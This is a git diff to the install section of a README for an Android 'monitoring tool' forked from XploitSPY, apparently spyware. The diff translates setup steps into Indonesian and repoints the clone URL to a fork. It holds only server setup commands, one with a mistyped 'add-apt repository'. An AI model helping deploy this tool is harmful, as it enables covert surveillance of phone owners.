@@ -31,24 +31,28 @@ A cloud based Android Monitoring Tool
 1. Install JRE 11 
     - Debian, Ubuntu, Etc
         - `sudo apt-get install openjdk-11-jre`
+    Jika terdapat pesan X:Unable to locate package , kamu bisa ketikan command berikut
+        - "sudo add-apt repository ppa:openjdk-r/ppa"
+        - "sudo apt-get update"
+        - "sudo apt-get install openjdk-11-jre"
    
-2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)
+2. Install NodeJS [Sesuai OS yang kamu Pakai](https://nodejs.org/en/download/package-manager/)
 
 3. install PM2 
     - `sudo npm install pm2 -g`
 
 4. Clone the repo
-    - `git clone https://github.com/XploitWizer/XploitSPY.git`
+    - `git clone https://github.com/eosageng/android-SPY.git`
     
 5. Go to server directory
-   - `cd XploitSPY/server/`
+   - `cd android-SPY/server/`
 
-5. In the server directory, run these commands
-    - `npm install` <- install dependencies
+5. In the server directory, ketikan command berikut ini
+    - `npm install` <- Wajib Install , Gunakan NODEJS Versi Terbaru agar tidak error saat instal NPM
     - `pm2 start index.js` <-- start the script
-    - `pm2 startup` <- to run XploitSPY on startup
+    - `pm2 startup` <- untuk memulai X-SPY di startup
 
-6. Find your public IP `curl ifconfig.me`
+6. Cek IP Public `curl ifconfig.me`
 
 7. In your browser navigate to your Server Static IP Address` Ex.: http://192.168.55.203`
 
